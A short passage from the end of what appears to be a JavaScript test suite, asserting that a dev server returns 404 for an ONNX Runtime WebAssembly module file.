    expect((await fetch(`${devBase}/ort/${VERSION}/ort-wasm-simd-threaded.jspi.mjs`)).status).toBe(404);
  });
});
